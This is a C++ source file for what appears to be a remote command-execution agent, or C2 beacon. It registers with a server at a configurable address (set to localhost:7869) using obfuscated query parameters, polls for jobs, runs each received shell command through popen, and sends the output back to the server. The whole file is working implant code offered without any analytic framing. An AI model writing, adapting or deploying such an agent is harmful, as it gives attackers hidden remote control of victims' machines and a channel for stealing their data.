#include <iostream>
#include <string>
#include <sstream>
#include <cstring>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdexcept>
#include <uuid/uuid.h>
#include <chrono>
#include <random>
#include <vector>
#include <algorithm>
#include <iomanip>

using namespace std;

class Job
{
public:
    std::string id;
    std::string command;
};

std::string extract_body(const std::string& response) {
    // Find the end of the headers (double CRLF)
    size_t pos = response.find("\r\n\r\n");
    if (pos == std::string::npos) {
        std::cerr << "Invalid HTTP response: no headers found" << std::endl;
        return "";
    }

    // Extract the body
    std::string body = response.substr(pos + 4);
    return body;
}

std::string ReplaceAll(std::string str, const std::string& from, const std::string& to) {
    size_t start_pos = 0;
    while((start_pos = str.find(from, start_pos)) != std::string::npos) {
        str.replace(start_pos, from.length(), to);
        start_pos += to.length(); // Handles case where 'to' is a substring of 'from'
    }
    return str;
}

string get_request(string host, string path, int port) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        cerr << "Error opening socket" << endl;
        return "";
    }

    struct addrinfo hints, *result;
    std::memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;     // allow IPv4 or IPv6
    hints.ai_socktype = SOCK_STREAM; 

    struct hostent* server = gethostbyname(host.c_str());
    int addrInfo = getaddrinfo(host.c_str(), "http", &hints, &result);
    if (addrInfo != 0) {
        cerr << "Error resolving host" << endl;
        return "";
    }

    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);

    if (connect(sockfd, (struct sockaddr*) &serv_addr, sizeof(serv_addr)) < 0) {
        cerr << "Error connecting to server" << endl;
        return "";
    }

    stringstream request_stream;
    request_stream << "GET " << ReplaceAll(path, " ", "%20") << " HTTP/1.1\r\n";
    request_stream << "Host: " << host << "\r\n";
    request_stream << "Connection: close\r\n";
    request_stream << "\r\n";
    string request = request_stream.str();

    if (send(sockfd, request.c_str(), request.length(), 0) < 0) {
        cerr << "Error sending request" << endl;
        return "";
    }

    string response;
    char buffer[1024];
    int bytes_received;
    while ((bytes_received = recv(sockfd, buffer, 1024, 0)) > 0) {
        response.append(buffer, bytes_received);
    }

    close(sockfd);

    return response;
}

std::string generate_unique_id() {
    // Use the current time as a seed for the random number generator
    unsigned seed = std::chrono::system_clock::now().time_since_epoch().count();
    std::mt19937 generator(seed);

    // Generate a random 64-bit integer
    std::uniform_int_distribution<uint64_t> distribution(0, UINT64_MAX);
    uint64_t random_number = distribution(generator);

    // Convert the random number to a string
    std::ostringstream oss;
    oss << std::hex << random_number;
    std::string unique_id = oss.str();

    // Return the unique ID
    return unique_id;
}

std::vector<std::string> split(const std::string& s, char delimiter) {
    std::vector<std::string> tokens;
    std::size_t start = 0, end = 0;
    while ((end = s.find(delimiter, start)) != std::string::npos) {
        tokens.push_back(s.substr(start, end - start));
        start = end + 1;
    }
    tokens.push_back(s.substr(start));
    return tokens;
}

std::string exec(const char* cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}

std::string baseAddress = "localhost";
std::string agentGuid = generate_unique_id();

void handshake() {
    get_request(baseAddress, "/?df2f1f3f7h6h4=n&agentGuid=" + agentGuid, 7869);
}

Job getJob() {
    std::string rsp = extract_body(get_request(baseAddress, "/?df2f1f3f8h6h4=n&agentGuid=" + agentGuid, 7869));
    std::vector<std::string> tokens = split(rsp, '"');
    try {
        std::string jobGuid = tokens[3];
        std::string command = tokens[7];
        return {jobGuid, command};
    }
    catch (exception e){
        return {"",""};
    }
}

void completeJob(Job j) {
    std::string rsp = exec(j.command.c_str());
    rsp.erase(std::remove(rsp.begin(), rsp.end(), '\n'), rsp.cend());
    std::string request = "/?df2f1f3f7h9h4=n&jobGuid=" + j.id + "&agentGuid=" + agentGuid + "&response=" + rsp;
    get_request(baseAddress, request, 7869);
}

int main(){
    sleep(5);
    handshake();
    sleep(3);
    while (true) {
        Job j = getJob();
        sleep(2);
        if (j.id != ""){
            completeJob(j);
        }
        sleep(2);
    }
    //std::string response = get_request("localhost", "/?df2f1f3f7h6h4=n&agentGuid=" + agentGuid, 7869);
    //std::cout<<response<<endl;
    sleep(2);
    Job j = getJob();
    sleep(2);
    completeJob(j);
    return 0;
}